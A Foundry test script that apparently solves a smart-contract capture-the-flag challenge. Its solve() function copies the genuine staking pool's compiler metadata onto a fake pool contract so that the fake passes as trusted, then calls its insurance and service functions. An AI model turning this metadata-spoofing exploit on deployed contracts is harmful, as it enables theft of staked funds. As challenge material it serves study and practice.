// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/Test.sol";
import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "./FakeStakingPool.sol";

contract Attacker is Test, Script {
    address deployer = makeAddr("deployer");
    uint256 attacker_key = vm.envUint("ATTACKER_KEY");
    address attacker = vm.addr(attacker_key);

    EthStaking staking;

    function setUp() public {
        vm.createSelectFork("mainnet");
        vm.startPrank(deployer, deployer);
        deal(deployer, 100 ether);

        staking = new EthStaking{value: 10 ether}();

        vm.stopPrank();
        console2.log("setUp done!");
    }

    function testExploit() public {
        vm.startPrank(attacker, attacker);

        solve();
        console.log("isSolved:", staking.isSolved());
        vm.stopPrank();
    }

    function getSlice(bytes memory data, uint start, uint len) public pure returns (bytes memory) {
        bytes memory b = new bytes(len);
        for (uint i = 0; i < len; i++) {
            b[i] = data[i + start];
        }
        return b;
    }

    function solve() public {
        bytes memory poolCode = address(staking.pool()).code;
        uint16 metadataLength = uint16(bytes2(getSlice(poolCode, poolCode.length-2, 2)));
        bytes memory metadata = getSlice(poolCode, poolCode.length - metadataLength - 2, metadataLength + 2);

        bytes memory fakeCode = type(FakeEthStakingPool).creationCode;
        bytes memory arg = abi.encode(address(staking), address(staking.insurance()));
        uint16 fakeMetadataLength = uint16(bytes2(getSlice(fakeCode, fakeCode.length-2, 2)));
        fakeCode = getSlice(fakeCode, 0, fakeCode.length-fakeMetadataLength-2);
        bytes memory finalCode = abi.encodePacked(fakeCode, metadata, arg);
        address payable newContract;
        assembly {
            newContract := create(0, add(finalCode, 0x20), mload(finalCode))
        }

        FakeEthStakingPool fakeStaking = FakeEthStakingPool(newContract);
        fakeStaking.registerInsurance();
        fakeStaking.endOperatorService();

    }
}


